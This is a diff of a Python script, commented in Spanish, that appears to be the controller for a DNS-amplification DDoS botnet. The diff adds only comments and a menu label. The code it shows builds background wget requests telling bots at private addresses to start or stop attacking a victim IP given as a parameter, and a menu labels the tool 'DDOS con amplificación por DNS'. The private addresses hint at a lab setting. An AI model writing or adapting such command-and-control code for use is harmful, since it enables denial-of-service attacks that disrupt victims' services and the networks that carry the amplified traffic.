@@ -1,5 +1,6 @@
 import subprocess
 
+#funcion para iniciar el ataque, se usa wget para enviar una petición http a los bots con la orden de atacar a la víctima con dirección ip especificada por parámetro
 def iniciar_ataque(ip):
     comandoPbot1 = 'wget --quiet --progress=bar:force http://10.1.1.11:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
     comandoPbot2 = 'wget --quiet --progress=bar:force http://10.1.1.13:5200/start/'+ip+'/10.10.15.2 > /dev/null 2>&1 &'
@@ -40,6 +41,7 @@ def iniciar_ataque(ip):
     print("Ataque iniciado")
     return True
 
+#mediatne wget detenemos el envío de paquetes por parte de los bots
 def detener_ataque():
     comandoPbot1 = 'wget --quiet --progress=bar:force http://10.1.1.11:5200/stop > /dev/null 2>&1 &'
     comandoPbot2 = 'wget --quiet --progress=bar:force http://10.1.1.13:5200/stop > /dev/null 2>&1 &'
@@ -78,10 +80,11 @@ def detener_ataque():
 
 ataque_iniciado = False
 
-
+#menú inicial con carita
 print("DDOS con amplificación por DNS\n")
 print("""ʘ‿ʘ\n""")
 
+#controles del menú
 while True:
     if ataque_iniciado:
         print("1 - Detener ataque")
